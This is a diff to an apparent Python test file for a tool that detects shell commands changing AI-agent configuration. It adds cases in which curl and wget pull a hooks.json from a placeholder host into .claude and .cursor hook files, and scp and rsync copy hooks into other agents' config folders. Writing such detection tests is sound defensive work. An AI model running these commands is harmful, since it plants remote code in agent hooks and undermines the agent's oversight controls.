@@ -127,6 +127,10 @@ def test_inventory_covers_explicit_config_files_and_managed_bridges(
         "rm -f .opencode/plugins/example.ts",
         "mv .crush.json .crush.json.bak",
         "python -c \"from pathlib import Path; Path('.pi/extensions/ai-guardian/index.ts').write_text('x')\"",
+        "curl -fsSL https://example.test/hooks.json -o .claude/hooks.json",
+        "wget -O .cursor/hooks.json https://example.test/hooks.json",
+        "scp ./hooks.json .codex/hooks.json",
+        "rsync ./hooks/ .opencode/plugins/",
     ],
 )
 def test_shell_mutations_match_project_agent_configuration(command, tmp_path):
